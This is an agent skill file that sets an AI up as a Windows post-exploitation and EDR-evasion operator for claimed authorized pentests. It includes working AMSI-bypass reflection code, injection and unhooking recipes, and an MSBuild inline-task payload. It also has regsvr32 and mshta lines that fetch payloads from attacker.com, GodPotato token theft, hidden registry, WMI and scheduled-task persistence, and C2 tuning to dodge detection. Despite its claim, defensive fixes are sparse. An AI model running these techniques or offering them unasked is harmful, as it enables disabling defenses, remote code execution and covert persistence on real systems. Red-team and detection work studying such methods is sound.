---
name: windows-evasion
description: Windows post-exploitation and EDR evasion specialist for authorized pentests — covers 2026-state AMSI bypass (patchless HWBP/VEH, Write Raid, amsiInitFailed), ETW evasion, ntdll unhooking (HalosGate/TartarusGate/fresh-copy), direct and indirect syscalls, process injection (thread hijack, APC, module stomping, phantom hollowing, Ekko sleep masking), LOLBAS abuse, BOF execution, token impersonation (GodPotato), persistence (registry/WMI/scheduled tasks), and C2 profile hardening. Pairs every technique with its detection event IDs and defensive fix. Triggers on: AMSI bypass, EDR evasion, ETW bypass, syscalls, process injection, LOLBAS, sleep masking, token impersonation, GodPotato, BOF, Windows post-exploitation, unhooking.
---

# Skill: windows-evasion

## Trigger

Fire when the task involves:
- Bypassing AMSI or Windows Defender in an authorized engagement
- ETW evasion or unhooking ntdll
- Choosing a process injection technique
- LOLBAS (living-off-the-land binary) abuse
- BOF (Beacon Object File) execution
- Token impersonation / privilege escalation via tokens
- Persistence mechanisms (registry, WMI, scheduled tasks)
- C2 profile hardening to evade JA4H/c2detect fingerprinting
- Defense enumeration before burning a bypass

## Instructions

### The 2026 Honest State (read first)

```
AMSI:      Static AmsiScanBuffer NOPs are dead — .text integrity checks + VirtualProtect ETW
           see them. Current art = patchless: HWBP/VEH hijack, context-struct corruption,
           amsiInitFailed, Write Raid, provider-side (MpOav) attacks.

ETW:       User-mode EtwEventWrite patches blind only the process's own user-mode providers.
           ETW Threat Intelligence fires inside ntoskrnl post-syscall — kernel telemetry
           survives everything user-mode. Design for being seen.

Injection: CreateRemoteThread is a detection honeypot. Modern = thread hijack variants,
           APC/callback, module stomping, phantom hollowing, PPID spoofing, Ekko sleep masking.

LOLBAS:    MSBuild/regsvr32/mshta/rundll32/InstallUtil bypass AMSI/AV/AppLocker because
           they ARE signed Microsoft binaries. Detection = parent-child anomalies.

C2:        Default C2 profiles are effectively pre-detected (JA4H, c2detect fingerprints
           21 families). Sleep-mask + jitter required. Havoc archived 2026-02-20.
           Sliver active (12.2k stars).
```

### Phase 1 — Defense Enumeration (BEFORE burning a bypass)

```powershell
# Check what's actually running (noise-ordered planes: in-process → registry → WMI → binary)

# 1. In-process API check
Get-MpComputerStatus | Select-Object -Property AMServiceEnabled, AntivirusEnabled,
  RealTimeProtectionEnabled, IsTamperProtected

# 2. Installed EDR/AV products (WMI)
Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct | Select-Object displayName

# 3. Running security services
Get-Service | Where-Object {$_.Name -match "MsSense|CylanceSvc|CarbonBlack|SentinelAgent|CrowdStrike"}

# 4. Registry-based
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware
reg query "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend"

# 5. Check AMSI providers
reg query "HKLM\SOFTWARE\Microsoft\AMSI\Providers"
```

### Phase 2 — AMSI Bypass (2026 Patchless Methods)

**Generation 2 — HWBP/VEH (zero bytes patched, invisible to .text integrity)**
```
Mechanism:
1. Set hardware breakpoint on AmsiScanBuffer: DR0 = &AmsiScanBuffer, arm DR7
2. Register VEH (Vectored Exception Handler)
3. When AmsiScanBuffer is called → EXCEPTION_SINGLE_STEP fires → VEH takes over
4. VEH forges AMSI_RESULT_CLEAN into the output argument, advances RIP past the function
5. Zero bytes in amsi.dll modified → integrity checks see nothing

References:
- TheEnergyStory/PatchlessEtwAndAmsiBypass (24 stars, BSD-3, Turla Kazuar v3 lineage)
  https://github.com/TheEnergyStory/PatchlessEtwAndAmsiBypass
- SnailSploit/Claude-Red offensive-edr-evasion SKILL.md (9,598 stars, MIT)
```

**amsiInitFailed (reflection — still works when obfuscated)**
```powershell
# Via reflection (strings are detected — obfuscate before use)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

**Write Raid (abuse AMSI's own write path)**
```
Reference: V-i-x-x AMSI Write Raid repo (336 stars)
Technique: Abuse AMSI's own write path instead of signatured NOPs
Avoids: both .text integrity checks AND VirtualProtect ETW
```

### Phase 3 — ETW Evasion

```
ETW Threat Intelligence (ETW-TI):
- Fires inside ntoskrnl, post-syscall
- Survives ALL user-mode patches
- DO NOT expect ETW-TI blind from user-mode patching

What user-mode patching DOES blind:
- Process-local user-mode providers only
- Script block logging (EtwEventWrite in PowerShell / AMSI)

Patchless ETW + AMSI (same HWBP approach):
- TheEnergyStory/PatchlessEtwAndAmsiBypass
- Hardware breakpoint on EtwEventWrite → forged return before write
```

### Phase 4 — ntdll Unhooking / Syscalls

```
Hell's Gate:   Read syscall number from ntdll in memory
Halo's Gate:   If ntdll is hooked, walk neighboring syscalls to derive the real number
Tartarus Gate: Similar to Halo's Gate with different neighbor-walk algorithm
FreshyCalls:   Sort syscall stubs to infer numbers from order
Fresh copy:    Map a fresh ntdll from disk (direct file read, bypasses in-memory hooks)
Indirect syscalls: Jump to the real `syscall` instruction inside ntdll 
              (blends with legitimate traffic; kernel callbacks still see you)
Direct syscalls: Write syscall instruction inline; EDR ntdll hooks completely bypassed
               but stands out in call-stack analysis (no ntdll frame)

Reference: hypnguyen1209/offensive-claude skills/edr-evasion/SKILL.md
           kill_chain/attck_tactics frontmatter, SHA-256 skills-lock.json
```

### Phase 5 — Process Injection Techniques

```
AVOID (honeypot):
- CreateRemoteThread (EID 1-10 process_access + EID 8 create_remote_thread)

CURRENT TECHNIQUES:
1. Thread hijack:     SuspendThread → NtWriteVirtualMemory → SetThreadContext → ResumeThread
2. APC injection:     NtQueueApcThread (alertable threads required)
3. Module stomping:   Overwrite legitimately-loaded DLL's .text section in target process
4. Phantom hollowing: Hollow a sacrificial process before it executes (no original code ever runs)
5. PPID spoofing:     CreateProcess with ParentPID attribute set to Explorer/svchost
6. Ekko (sleep masking): Encrypt shellcode in memory during sleep; ROP-chain timer abuse
   Reference: Cracked5pider/Ekko (843 stars) https://github.com/Cracked5pider/Ekko
7. Zilean:            Similar sleep obfuscation with different ROP chain
```

### Phase 6 — LOLBAS Abuse

```powershell
# MSBuild inline task (C# code in XML, bypasses AMSI/AV/AppLocker)
# File: build.xml
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <ClassExec />
  </Target>
  <UsingTask TaskName="ClassExec" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          using System.Diagnostics;
          public class ClassExec : Task {
            public override bool Execute() {
              Process.Start("cmd.exe", "/c whoami > C:\\Users\\Public\\out.txt");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
# Execute: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe build.xml

# regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
# mshta http://attacker.com/payload.hta
# rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...
# InstallUtil /logfile= /logtoconsole=false /U payload.exe
```

### Phase 7 — BOF (Beacon Object File)

```
BOF = small COFF blob executed in-process
Benefits:
- No EID 1/4688 (new process creation)
- No console window
- No on-disk artifact (if loaded from memory)
- Compatible with Cobalt Strike, Havoc, Sliver, Brute Ratel

Common BOF operations:
- CredManDump: dump Windows Credential Manager
- adcs_request: request ADCS certificate from within beacon
- TrustKit bypass: set SSL bypass in-memory

References:
- trustedsec/CS-Situational-Awareness-BOF
- ajpc500/BOFs
```

### Phase 8 — Token Impersonation

```powershell
# GodPotato (2026 default potato — works Win8-Win11, Server 2012-2022)
# Previous: JuicyPotato (dead >= 1809), PrintSpoofer, RoguePotato
.\GodPotato.exe -cmd "cmd /c whoami"

# Manual token impersonation (when SeImpersonatePrivilege available)
whoami /priv | findstr Impersonate  # check privilege

# Koh-class token leak (steal tokens without touching LSASS)
# Installs named pipe, waits for privileged auth events
# Stealthier than LSASS dump — bypasses LSASS-access detection rules entirely
```

### Phase 9 — Persistence

```powershell
# 1. Registry run key (noisy, well-detected)
# Avoid unless specifically testing detection

# 2. Embedded-null registry values (SharpHide)
# Creates registry key with null byte in name — invisible to regedit
.\SharpHide.exe /create /path:"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" /name:"update`0" /value:"payload.exe"

# 3. WMI fileless (CIM OBJECTS.DATA — survives reboots, no file on disk)
$code = "cmd /c ..."
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{...}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{...}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{...}

# 4. Ghost scheduled task (ShadowScheduler — RPC-registered, invisible to schtasks.exe)
# Reference: ShadowScheduler tool

# Detection for all three:
# Symon EID 19/20/21 (WMI), EID 11 (file create), reg monitoring
# olafhartong/sysmon-modular config (3.2k stars)
```

### Phase 10 — C2 Profile Hardening

```
JA4H and c2detect fingerprint 21 C2 families by default profile.
Required hardening:
1. Custom HTTP headers (Host, User-Agent, Accept must look browser-legitimate)
2. GET/POST URIs matching common web paths (/jquery.min.js, /api/v1/update)
3. Jitter: uniform jitter keeps CV ~0.115 — RITA-class detection survives
   Use Gaussian or Poisson jitter distribution instead
4. Sleep masking: Ekko or Zilean to encrypt memory during sleep
5. Malleable C2 profile: match beacon traffic to legitimate app traffic pattern

Sliver (active 2026, 12.2k stars): use --wasm-ext for traffic shaping
Havoc: archived 2026-02-20 — migrate to Sliver or Brute Ratel
```

## References

- SnailSploit/Claude-Red offensive-edr-evasion — https://github.com/SnailSploit/claude-red (9,598 stars, MIT)
- hypnguyen1209/offensive-claude edr-evasion — https://github.com/hypnguyen1209/offensive-claude (403 stars, MIT)
- TheEnergyStory/PatchlessEtwAndAmsiBypass — https://github.com/TheEnergyStory/PatchlessEtwAndAmsiBypass (24 stars, BSD-3)
- Cracked5pider/Ekko — https://github.com/Cracked5pider/Ekko (843 stars)
- SigmaHQ/sigma — https://github.com/SigmaHQ/sigma (11,300 stars)
- redcanaryco/atomic-red-team — https://github.com/redcanaryco/atomic-red-team (12,700 stars, MIT)
- olafhartong/sysmon-modular — https://github.com/olafhartong/sysmon-modular (3,200 stars, MIT)
- Source report: ghost-walker-deep-research-2026-10-27.md